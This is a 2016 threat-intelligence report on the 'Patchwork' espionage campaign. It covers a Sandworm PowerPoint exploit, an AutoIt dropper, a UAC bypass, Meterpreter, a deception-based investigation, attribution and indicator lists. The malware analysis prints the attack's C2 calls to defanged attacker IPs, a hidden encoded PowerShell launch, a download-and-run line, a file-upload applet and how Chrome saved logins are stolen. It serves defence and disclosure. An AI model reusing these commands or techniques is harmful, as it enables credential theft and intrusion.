© 2016 Cymmetria Inc. All rights reserved. Confidential and proprietary.UNVEILING PATCHWORK – THE COPY-PASTE APTA targeted attack caught with cyber deceptionThis report can be found at: url All IoCs (in CSV and STIX formats), and the MazeRunner campaign file, can be found on Cymmetria Research’s GitHub, here: url© 2016 Cymmetria Inc. observed in December 2015. There are indications of activity as early as 2014, but Cymmetria has not observed any such activity first hand.Patchwork targets were chosen worldwide with a focus on personnel working on military and political assignments, and specifically those working on issues relating to Southeast Asia and the South China Sea. Many of the targets were governments and government-related organizations.What makes this report special is that Patchwork is the first targeted threat captured using a commercial deception product. Through the use of deception campaigns created with Cymmetria’s MazeRunner, we were able to catch the threat actor’s second stage toolset, as well as lateral movement activity.The code used by this threat actor is copy- pasted from various online forums, in a way that reminds us of a patchwork quilt – hence the name we’ve given the operation. In active victim systems, Patchwork immediately searches for and uploads documents to their C&C, and only if the target is deemed valuable enough, proceeds to install a more advanced second stage It is impossible to reach clear attribution from the information available. We have included an attribution section in this document to document our research efforts in this regard.Attacker operating times that overlap with a standard 9am-7pm workday (darker meanslarger volume)The deception campaign (see “The investigation” section)Research4TLP: GREENACKNOWLEDGEMENTS We would like to acknowledge our colleagues Brandon Levene at Palo Alto Networks, Kaspersky Lab’s GReAT team, and others whom we can’t mention, for their assistance and cooperation.Research5TLP: GREENTHE INVESTIGATION OVERVIEW The attack was detected as part of a spear phishing against a government organization in Europe in late May 2016. The target was an employee working on Chinese policy research and the attack vector was a PowerPoint presentation file. The content of the presentation was on issues relating to Chinese activity in the South China Sea.Screenshot of the first slide from one of the infected presentationsAfter the presentation is opened, the vulnerability highlighted by CVE-2014-4114 is exploited. This is a well documented vulnerability commonly called Sandworm, which only works on unpatched versions of Microsoft Office PowerPoint 2003 and 2007.Once the exploit worked, it deployed the first stage payload: a compiled AutoIt script. This script then bypassed UAC using a known method called UACME, the code for which was taken from an shell with Meterpreter – the RAT of the well known MetaSploit framework.The next stage was exfiltration of document files that are also used to validate the value of the infection. If the infected system was deemed valuable enough, the threat actor then infected the target host with a second stage payload, which was once again a module built from code taken from various online forums and resources.Flowchart of infection stagesSince the threat had already been detected and stopped, our goal was to discover as much as we could about the threat actor. Specifically, we were interested in tools, techniques, and procedures (TTPs), so that we would be able to detect the threat in case it succeeded in gaining a foothold elsewhere in customers’ assets. Learning about the threat actor’s TTPs would also allow us to prevent the threat actor from launching another operation targeted at our customer, as well as prevent them from launching similar attacks against other customers in the future.Our investigation proceeded on two fronts:1. We built a deception campaign to discover the second stage malware and the actor’s TTPs,while the operation was still active.2. We investigated the operation to uncover the threat actor’s capabilities.HUNTING THE ATTACKER WITH A DECEPTION CAMPAIGN In order to capture the attacker’s second stage malware (persistence) and observe their pivoting behavior in the network (lateral movement), we created a realistic environment in which to hunt the threat actor. We did so by using Cymmetria's MazeRunner solution to deploy a deception campaign. A deception campaign is essentially a story comprised of breadcrumbs and decoys; it leads attackers to believe that they have successfully gained access to a target machine.Breadcrumbs are pieces of data that lead an attacker to another machine; these could be stored credentials, open shares, browser cookies, VPN configurations, and more. Decoys are full operating systems running on virtual machines that act as real and high-value targets for an attacker; breadcrumbs point to decoys, which are fully monitored for any attacker interaction.Research7TLP: GREENThe campaign (which can be found on Cymmetria Research’s GitHub) was built to fit the specific profile of the active target. MazeRunner captured all the forensic data associated with the threat, so we knew that the threat actor followed the breadcrumbs and activated all the stages of their attack. MazeRunner allowed us to see all of the network traffic, operating system changes, and lateral movement the threat actor performed.This is the first time, to our knowledge, that an APT (or more aptly, a targeted attack) has been deceived and captured by a deception solution that caused the threat actor to follow breadcrumbs and attack decoys, ultimately leading to the disclosure of the operation.The deception campaign that caught the APTGETTING STARTED As mentioned in the previous section, our first order of business was verifying that the operation was still active, and then creating a deception campaign around it to catch the second stage malware and discover and mitigate other TTPs being used by the threat actor. To this end, we created a target in the form of a profile for a person in whom the threat actor was interested. We then constructed a deception campaign based on that profile. In this case, the person was a member of a government think tank dealing with security issues.A network around the infected endpoint was created using MazeRunner:• SMB shares were created on decoys, and mapped on the target laptop, to play the part ofnetwork backups.• Further, RDP credentials were deployed on the laptop to lead to a service running on a decoysystem in the cloud.SMB breadcrumb leading to the file server decoyResearch8TLP: GREENRDP Breadcrumb that leads to a cloud decoyCHAIN OF EVENTS 1. The PowerPoint PPS file was opened, which in turn dropped the initial payload components.The exploit used was CVE-2014-4114 (Sandworm).1.Driver.inf content2. The endpoint was infected with the following executables:••sysvolinfo.exe – AutoIt compiled script.PowerShell reverse shell HTTPS Meterpreter script – Was pulled from the C2 server and was executed using the following requests:••212[.]129.13.110/dropper.php?profile=<base64 of [username@computername]>hxxps://45[.]43.192.172:8443/OxGN3. Files from the target laptop were being uploaded by the threat actor to the control server,alongside significant activity on the encryption channel. We did not monitor the SSL encrypted channel, in order to avoid detection in case Meterpreter’s “sstagerverifysslcert” that path to the startup programs. This is how the threat actor achieves persistence.Research9TLP: GREEN6. Three days following the initial infection, alerts were received on the decoy running the SMBshared folder indicating access by the threat actor.7. The malware accessed the mapped share that was deployed as a breadcrumb on the infectedlaptop while scanning all the drives for files. The actual function that caused the alert was GetDriveTypeA (which is called to assure that only fixed drives are traversed).8. After the first alerts in the system were generated, we saw connection attempts to our cloud decoy via RDP. This decoy’s IP address was placed as an RDP credentials breadcrumb on the target laptop. The alerts originated from 212[.]129.7.146, and the entire event lasted for 12 minutes.9.The alerts we received in MazeRunner indicated that the attackers failed to log in several times, which makes us believe that they pulled the RDP connection file (breadcrumb) that was on the infected desktop. It is interesting to note that they didn’t mine the credentials using mimikatz (which would have enabled them to connect to the cloud decoy with ease).10. We believe this connection was carried out by the same threat actor because:• The IP they used to connect to our decoy also belongs to rev.poneytelecom.eu.• The event took place on the same day we received the alerts on our internal system.This shows that the threat actor was deceived into exfiltrating data, deploying their second stage persistence tool, and using the breadcrumbs that we left on the infected laptop. Furthermore, if they had used mimikatz, they also would have succeeded in connecting to our cloud decoy and be encouraged to deploy other, later stage tools.Network layoutResearch10TLP: GREENINTELLIGENCE GAINED FROM THE ACTOR’S C&C SERVER Through one of our partners, we managed to receive access to one of the threat actor’s command and control servers. The server contained a multitude of additional files:• An abundance of PPS files – the spear phishing infecting files• Additional malicious code packagesMost of the spear phishing files’ content2 was directly related to China-related subjects, or pornographic in nature. Some examples of the spear phishing PPS attachment files used by the threat actor:From the C&C server, we also extracted the dates on which the PPS lures were last modified; these dates ranged from December 2015 to January 2016. The dates were grouped together and then plotted. The resulting graph is a good indication of times at which we believe the attackers prepared and carried out their attack._____________Number of PPS edits by date2 We have no direct proof of this, but information from several partners suggests that stolen documents are being actively repurposed for spear phishing purposes.Research11TLP: GREENTECHNICAL ANALYSIS TOOLS DEPLOYED ATTACK VECTORFlowchart of infection stagesThe attack vector is a spear phishing email with a PPS file attachment. It utilizes the exploit of CVE-2014-4114 (Sandworm). The exploit code closely resembles a public proof of concept exploit found on exploit-db1³. The exploit enables the attacker to drop files and execute an INF file, which is a Windows driver descriptor file.Through the exploit, the attack drops two files that are embedded in an OLE object to the local machine:• Driver.inf• Sysvolinfo.exeDriver.inf contentAfter dropping the files, the exploit executes the INF file by calling the Windows utility InfDefaultInstall.exe with the dropped driver.inf as a parameter.This causes the execution of the Windows utility RunOnce.exe, which receives the sysvolinfo.exe file as a parameter and executes it._____________³ url GREENDROPPERThe sysvolinfo.exe is the first stage payload of the threat actor (another name seen is uplv1032.exe). Its purpose is to escalate privileges, exfiltrate data, and download and execute an online remote access tool based on PowerSploit⁴. Through the now installed Meterpreter, the actor can issue commands to run on the infected machine manually.Originally created by an unknown user of “O RLY Cover Generator”5The sysvolinfo.exe code itself is a compiled AutoIt script. A significant portion of its code is copied from the online hacking forum “Indetectables”6.C&C COMMUNICATIONSOnce the tool starts, its first action is to connect back to the C&C server and send a beacon, listening for commands. Below is the analysis of the C&C protocol.Definitions:ComputerID = BASE64ENCODE(“$USERNAME@$COMPUTERNAME”)ddager = Is startup registry key added (Bool)r1 = BASE64ENCODE(result of OSVersion macro, e.g. WIN_7)r2 = BASE64ENCODE(result of OSArch macro, e.g. X64)r3 = BASE64ENCODE(trojan version, 1.1 in our sample)r4 = BASE64ENCODE(Does the SQLite database folder ( @UserProfileDir & Data\Default\”) exist (1) or not (0))“\AppData\Local\Google\Chrome\Userr5 = BASE64ENCODE(stdout of last cmd command)r6 = BASE64ENCODE(1 if running as administrator, 0 if not)On beacon function call a POST request to:- hxxp://212[.]129.13.110/dropper.php?profile= + $ComputerID_____________⁴ PowerSploit: the PowerShell version of Meterpreter, a popular remote access tool from the MetaSploit framework. is the argument for the command.The available commands are:Command ID“1”“2”“3”“4”“5”“6”“7”“8”Command explanationThe debug print describes the command as "[+] ServFlag : Disabled", but the actual code is doing nothing.If command “2” wasn’t called before, then execute a PowerShell script with the UAC bypass vulnerability: "powershell -nop -wind hidden -noni -enc " & $PAYLOADReset the inner state of the script to ignore previous execution of command “2”, thus allowing command “2” to execute again.Exit the script.Executes _emorhc function with base64decode($payload) as arg (see below).Executes _getnewver function with base64decode($payload) as arg (see below).Executes _instcust function with base64decode($payload) as arg (see below).Executes the cmd command stored in base64 in $payload and saves its output to r5.Functions:_emorhc($dllurl) – Searches for sqlite3.dll (or sqlite3_x64.dll in 64 bit). If not found, it downloads it from $dllurl. The function then proceeds to close all the “chrome.exe” processes, dump the login data database @USERPROFILEDIR & "\AppData\Local\Google\Chrome\User Data\Default\Login Data" into C:\recoveryx\Protected.ie2, upload the file, and delete it. Note: the authors forgot to delete the c:\recoveryx directory._getnewver($newverurl) – Deletes itself, downloads a new version from $newverurl, and System.Net.WebClient).DownloadFile('" & $newverurl & "', '" & @SCRIPTFULLPATH & "') & " & @SCRIPTFULLPATH”.They are using ping between commands for an unknown reason. A possible usage is as a sleep(5).Research14TLP: GREEN_instcust($custurl) – Downloads a “custom” executable and executes it with the UAC bypass vulnerability._upload($f_path, $f_name, $repeat, $retry) – Handles all file upload. It uploads the file $f_path to hxxp://212[.]129.13.110/update-request.php?profile= + $ComputerID, with a maximum retry count of 5. The post contains the following data:"Content-Disposition: form-data; name=""filename""; filename=""" & $f_name & "|" & $f_hash & """" & @CRLF & @CRLF & $ffile & @CRLFWhere $f_hash is the md5 cheksum of the file to be uploaded, $f_name is the base64 encoding of $f_name, and $ffile is the content of the file.After sending beacon to the server, it continues to scan the “Program Files” directories (both x86 and the standard path) for a directory with the string “Total Security”⁶ (the installation path of the “360 Total Security”7 antivirus), and, oddly, proceeds to do nothing with that knowledge.The payload will install itself in the startup programs folder as "Baidu Software Update" (HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run). It then sends another beacon to the server, after which it starts to recursively go over all of the fixed drives in the computer and look for files with the following extensions:• doc• pdf• csv• ppt• docx• pst• xls• xlsx• pptxIt then uploads all of the files to the server at:212[.]129.13.110/update-request.php?profile=The decompiled applet which drives this functionality has a very interesting PDB included “C:\Users\Kanishk\Documents\Visual Studio 2015\Projects\ConsoleApplication1\ConsoleApplication1\obj\Debug\ConsoleA pplication1.pdb”.____________7 url GREENApplet code included below:namespace ConsoleApplication1{internal class Program{private static void Main(string[] args){try{string fileName = args[0];WebClient webClient = new WebClient();webClient.UploadFile(args[1], "POST", fileName);}catch{}}}}PRIVILEGE ESCALATIONAfter the previous stages, the payload uses a well known and as-of-yet unpatched UAC bypass vulnerability in Microsoft Windows (known as UACME8), which works on the default setup of Windows 79. This allows the attackers to execute commands as Administrator.If the AutoIt script is compiled for x86 systems (/x86 flag), the payload hides the UAC bypass vulnerability exploitation inside svchost.exe using a technique called Process Hollowing10 (UAC bypass method – ‘IFileOperation COM Object’11). If the AutoIt script is compiled for x64 systems (/x64 flag), the oobe12 UAC bypass method is used.___________8 url According to research, also Windows 8 as claimed by Peter Kleissner, url url url url GREENSHELLCODE EXECUTIONWhen the AutoIt malware’s heartbeat receives a “2” in $sdata (this seems to be the most common scenario), the included, base64-encoded response data is decoded and executed using the command “powershell -nop -wind hidden -noni -enc”. We observed that the base64 encoded payload was a PowerShell script that closely resembled code designed to allow x86 shellcode to run on x64 architectures13. This PowerShell script executed an additional payload, which was a PowerSploit script14 used to invoke shellcode containing a reverse HTTPS Meterpreter.REVERSE HTTPS METERPRETERThe AutoIt script escalates privileges and then executes a PowerShell script that is easily fingerprinted as a reverse HTTPS Meterpreter. It seems likely that the PowerShell scripts were copied from an online blog15, and the Meterpreter payload inside was generated using the parameters:• LHOST=45[.]43.192.172• LPORT=8443The process tree of the initial exploit and later payloadsSECOND STAGE PAYLOADThis tool is only downloaded and installed after the attacker first uses the Meterpreter and determines that the target is valuable. We refer to the payload as 7zip.exe, but it can also be named ndcrypt.exe and nd.exe.___________13 url url url GREENHex view of the 7zip.exe memory dumpMost of this payload’s code is based on a public online code project in GitHub16.Once unpacked, the module performs these actions:•In order to persist past computer shutdown and power on, the payload copies itself to a system directory, renames the file to netmon.exe, and adds the executable to the startup programs as “Net Monitor”:C:\Windows\SysWOW64\netmon.exe - example of the final destination on 64-bit system running 7zip.exe/netmon.exe via WOW64• One thread scans all drive letters and exfiltrates files with certain extensions in the permanentdrives (not searching network drives or USB).Note: this is called the GetDriveTypeA function in kernel32.dll, which caused the alert on our system.• Another thread is uploading files of the same formats as from the Dropper payload (see above)to hxxp://212[.]83.191.156/http/up.php.• Another thread downloads an executable fromhxxp://212[.]83.191.156/http/down.php and executes it. We didn’t observe this behavior.___________16 url GREENATTRIBUTIONWhile we cannot make definitive claims of attribution, we will present evidence that may assist in later efforts to identify this threat actor.PREVIOUSLY EXAMINED INFORMATION Let’s examine the attribution information we have discussed thus far in this report.Many of the primary targets of this campaign are regional neighbors of India, and other targets seem to be targeted (by their interests, occupation, and by the content of the spear phishing) to issues affecting India. Circumstantially, this targeting correlates with intelligence requirements necessary for a pro-Indian entity.However, we felt this was not enough to draw direct conclusions. What we believe makes this correlation much stronger and hints that this is a pro-Indian or Indian entity, is the addition of time of day activity analysis as detailed below.PPS EDIT TIME ANALYSIS17 Following a review of the PPS files found on the C&C server, we extracted data concerning the time of day when each PPS file was last modified, and plotted this on a graph. Below, we can see that more editing occurred during certain hours of the day.Number of edits by time of day___________17 Time zone analysis and research activity associated with daytime hours is circumstantial by definition. Some threat actors work around the clock, and manipulation of timestamps has been seen in past attacks by various threat actors. While it should be treated with due suspicion, it has also proven itself highly valuable in analysis of APT threat actors in the past and cannot be discounted.Research19TLP: GREENBased on modification times of the infecting presentation files, we see two distinct batches of work. The first, where the bulk of changes has been made, stretches from around 4:00 to 12:00 in coordinated universal time. To visualize what exactly that means, this time range was considered in the context of a standard 9am - 7pm work day and applied to a map. The “First stretch of work” label on the map below depicts the areas of the world in which 4:00 - 12:00 UTC would fall within the standard work day. Similarly, the time zones shaded within the “Second stretch of work” area are representative of the areas of the world in which 19:00 - 22:00 UTC falls within the work day. Since the time span of the second stretch of work is smaller in range, the hours in universal time fall within the working hours of more countries. Based on this map, we can conclude that it is most likely that the threat actors were based within the blue areas.Attacker operating times that overlap with a standard 9am-7pm workday (darker means largervolume)Many of the conclusions drawn from the above map were also confirmed through other sources. Extra data we were able to extract and analyze further correlated with this data, as well as with the previous PPS data.Research20TLP: GREENC&C ACTIVITY TIMES The time at which servers were staged was listed not only by hour, but by day of the week. After plotting these times by hour, with the day of the week specified through color coordination, we can see various patterns. It was more common for servers to be staged on certain days of the week, such as Sunday, rather than on other days, such as Saturday. These times are also clustered together in a clump for the most part, with almost no activity earlier than 2:00 UTC, and besides one exception on Sunday, not later than 11:00 UTC. This clump is very similar to the range of time specified within the first clump of time in the PPS editing graph and the “First stretch of work” area of the “Threat actor working hours” diagram.Displays the number of times a server was staged by hour of day, color-coordinated by day ofthe weekOther data extracted from the server included the time of day and day of the week of domain registrations. After plotting these on a graph, we observed that domains were registered only on specific days of the week. The other important feature is that all of these incidents occurred between 3:00 and 15:00 UTC, which is a slightly wider range than the first stretch of time in the PPS editing graph, but still very comparable.Research21TLP: GREENDisplays the number of domain registrations by hour of day, color-coordinated by day of theweekExtra analysis we were able to conduct was on the compilation times, by time of day and day of the week. After plotting these on a graph, we observed that, similar to domain registrations, compilations only occurred on specific days of the week. All the events took place between 2:00 and 10:00 UTC, which is only a slight shift of the time span in the first stretch of PPS editing.Research22TLP: GREENDisplays the number of compilations by hour of day, color-coordinated by day of the weekAll three of these graphs provide confirmation that these attacks were clustered partially by day of the week but mostly by time of day. Specifically, the time of day when staging servers, domain registration, and compilations occurred most frequently lined up with the first stretch of time seen in the PPS18 editing data. This applies to the area of the map within the “First stretch of time” label and adds weight to our conclusion that the threat actors live in the blue area.This time of day activity data, when combined with the previous circumstantial evidence (the threat actor’s intelligence requirements, the countries targeted around India, the other targets around the world, and the content of the spear phishing, directs us to the conclusion that this threat actor correlates with a location in India.Carefully, we feel obligated to note that further evidence suggests potential links between this threat actor and the operations known as Hangover/Appin, but this possible link is still being researched and is far from conclusive.That said, attribution is tricky business and it’s never possible to be entirely conclusive.___________18 Information from several partners suggests that the documents being stolen and then repurposed for spear phishing purposes also contain language indicators that support our hypothesis, but we have no direct information to support this.Research23TLP: GREENCONCLUSIONSPatchwork is a highly successful targeted attack operation, infecting approximately 2,500 high- value targets worldwide. It is surprising that it has remained undetected since its operations began in December, as it seems to have been built out of a confluence of code taken from various public and hidden criminal forums, as well as various open source projects.What makes this disclosure special is the use of Cymmetria’s cyber deception platform19 to catch the threat actor, capturing their second stage toolset and lateral movement activity. Without deception, capturing second-stage tools and activity has previously been difficult (to say the least).The high degree of operational capacity stands in stark contradiction to the low technical ability displayed, which raises the question of whether the copy-paste nature of the threat was potentially intentional, perhaps an evolution of threat actors attempting to avoid the high cost of losing their expensive tool box and malware when they are eventually publically disclosed. This, however, seems unlikely, as the use of such second-hand code is consistent with their second stage toolset meant for persistence, which should typically be built to resist detection.While one can almost never be conclusive in attribution, based on the information we have it is plausible that the threat actor is a pro-Indian one. As our CEO Gadi Evron said in an internal discussion, “There is a possibility that another threat actor wanted to look like India and built a false flag operation to fit, but there is zero evidence to support that claim, and it feels like we’re reaching just to attack our own argument.”Unlike other APT threat actors, India seems to be a relatively quiet locale for cyber espionage activity, if indeed this is a pro-Indian threat actor, it is noteworthy by itself. The scope and scale of this operation are quite surprising considering the low technical capability displayed, which we believe is a growing trend seen among disparate threat actors.___________19 Cymmetria’s MazeRunnerResearch24TLP: GREENAPPENDIX 1 – IOCSAll IoCs (in CSV and STIX formats), and the MazeRunner campaign file, can be found on Cymmetria research’s GitHub, at: url HASHES 212[.]129.13.110 - AutoIt script C2212[.]129.7.146 - IP address used to connect to the cloud decoy with45[.]43.192.172 - IP address used in the PowerShell scriptPOST REQUESTS hxxp://212[.]129.13.110/update-request.php?profile=hxxp://212[.]129.13.110/dropper.php?profile=URLs Spear hosting websites:hxxp://cnmilit[.]com/hxxp://t.ymlp50[.]com/jmyafaejshbafahshaaambmus/click.phpResearch25TLP: GREENSUSPECTED IOCsmozarting[.]comblingblingg[.]comaaskmee[.]comrevoltmax[.]comeyescreem[.]comoutlookkz[.]comxmachinez[.]compizzahomez[.]comnewsnstat[.]com163-cn[.]org81-cn[.]netclimaxcn[.]comexpatchina[.]infomiltechweb[.]comnduformation[.]comsecurematrixx[.]comxbladezz[.]comoffice-rb-support[.]comgreatdexter[.]comhaiwaipengyou[.]comextremerebolt[.]commatrixrevolt[.]cominfo81[.]comchinastrats[.]comepg-cn[.]comnutcn[.]commodgovcn[.]comclimaxcn[.]comsocialfreakzz[.]commilitaryworkerscn[.]comextremebolt[.]comlujunxinxi[.]comletsgetclose[.]commilresearchcn[.]comasiandefnetwork[.]comalfred.ignorelist[.]comdailychina[.]newssinodefprog[.]infoqqgroups[.]infochinastrat[.]commiltechcn[.]comnumeronez[.]comtelemediaz[.]commajidalfuttaiim[.]comwebworldreq[.]comnextraload[.]comjunshiyuehui[.]comcndailynetwork[.]infoextrememachine[.]orgwikifedia[.]spaceyue-lao[.]infoyou-yisi[.]comannchenn[.]comsymantecz[.]comnudtcn[.]com178[.]162.210.242178[.]162.210.243178[.]162.210.244178[.]162.210.245178[.]162.210.246178[.]162.210.247178[.]162.210.248178[.]162.236.4037[.]48.77.21437[.]48.77.21537[.]58.60.19543[.]249.37.17346[.]165.225.6646[.]165.229.746[.]165.229.8Research26TLP: GREEN46[.]165.229.946[.]165.248.23646[.]165.248.23746[.]165.248.23846[.]165.248.23946[.]165.248.24046[.]165.248.24146[.]165.248.24346[.]166.163.24346[.]166.163.24446[.]166.163.24691[.]229.79.18191[.]229.79.18291[.]229.79.18391[.]229.79.18491[.]229.79.18591[.]229.79.18691[.]229.79.18791[.]229.79.18891[.]229.79.189Registry keys:91[.]229.79.19093[.]115.95.13294[.]242.219.20394[.]242.223.1994[.]242.223.2094[.]242.223.2494[.]242.223.2894[.]242.231.24495[.]141.34.24295[.]141.34.24595[.]141.34.24695[.]211.205.14295[.]211.205.16195[.]211.205.16395[.]211.205.16495[.]211.205.16595[.]211.205.16695[.]211.3.135HKEY_CLASS_ROOT\Software\Microsoft\Windows\CurrentVersion\Run\Net Monitor (32 bit)HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Net Monitor (32 bit)HKEY_CLASS_ROOT\Software\Wow6432Node\Microsoft\Windows\CurrentVersion \Run\Net Monitor (64 bit)HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVers ion\Run\Net Monitor (64 bit)HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Baidu Software UpdateOTHER folder (e.g., tvr98E5.tmp)Research27TLP: GREENCONFIRMED INFECTING PRESENTATIONS 13_Five_Year_Plan_2016-20-1.pps - 